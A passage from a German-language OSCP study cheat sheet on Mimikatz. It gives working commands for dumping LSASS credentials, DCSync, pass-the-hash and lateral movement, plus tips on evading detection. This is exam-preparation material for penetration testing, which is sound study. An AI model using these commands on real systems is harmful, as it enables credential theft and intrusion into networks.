nxc smb 192.168.1.10 -u admin -p pass -M lsassy

# Output automatisch geparst
```

---

## 18. OSCP Tips

### 18.1 Exam-Safe Usage

```powershell
# ✅ ERLAUBT: Credential Dumping auf Pwn3d! Maschine
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# ✅ ERLAUBT: DCSync (wenn DA)
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator"

# ✅ ERLAUBT: Pass-the-Hash
.\mimikatz.exe "sekurlsa::pth /user:admin /domain:CORP /ntlm:HASH /run:cmd.exe"

# ⚠️ VORSICHT: Golden Ticket
# → Dokumentieren, dass es legitim ist!
# → Nur wenn explizit verlangt
```

### 18.2 Workflow

```powershell
# 1. Admin Shell bekommen
# 2. Mimikatz ausführen
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt

# 3. Hashes extrahieren
type creds.txt | findstr /i "ntlm" > hashes.txt

# 4. Pass-the-Hash für Lateral Movement
.\mimikatz.exe "sekurlsa::pth /user:admin /domain:CORP /ntlm:HASH /run:cmd.exe"

# 5. In neuer Shell: Zugriff auf andere Maschinen
dir \\DC01\C$
```

### 18.3 Common Mistakes

```powershell
# ❌ FEHLER: privilege::debug vergessen
.\mimikatz.exe "sekurlsa::logonpasswords"
# → Error!

# ✅ RICHTIG:
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"

# ❌ FEHLER: Keine Admin-Shell
# → privilege::debug schlägt fehl

# ✅ RICHTIG: Admin-Shell prüfen
net session
# Wenn Error → nicht Admin!

# ❌ FEHLER: WDigest disabled, erwartet Klartext
# → Windows 10+ hat kein Klartext standardmäßig

# ✅ RICHTIG: NTLM Hash nutzen (Pass-the-Hash)
```

---

## 19. Resources

- **Mimikatz GitHub**: https://github.com/gentilkiwi/mimikatz
- **Mimikatz Wiki**: https://github.com/gentilkiwi/mimikatz/wiki
- **HackTricks - Mimikatz**: https://book.hacktricks.xyz/windows/stealing-credentials/credentials-mimikatz
- **Pypykatz**: https://github.com/skelsec/pypykatz
- **ADSecurity - Mimikatz**: https://adsecurity.org/?page_id=1821

---

## 20. Final Notes

**Für OSCP:**
- Mimikatz = Post-Exploitation Standard-Tool
- Benötigt Admin/SYSTEM
- `privilege::debug` IMMER zuerst!
- NTLM Hashes > Klartext (Pass-the-Hash!)
- DCSync = Domain Admin → alle Hashes
- Golden Ticket = Domain Persistence
- LSASS Dump → Offline-Analyse sicherer

**Best Practice:**
1. Admin-Shell bekommen
2. `privilege::debug` ausführen
3. `sekurlsa::logonpasswords` → Hashes extrahieren
4. Pass-the-Hash für Lateral Movement
5. Bei DA: DCSync für alle Hashes
6. Bei Bedarf: Golden Ticket für Persistence

**OPSEC:**
- Mimikatz wird fast immer erkannt
- Alternative: Lsassy, Pypykatz, Comsvcs.dll
- LSASS Dump → Offline-Analyse
- Invoke-Mimikatz (In-Memory) besser als Binary
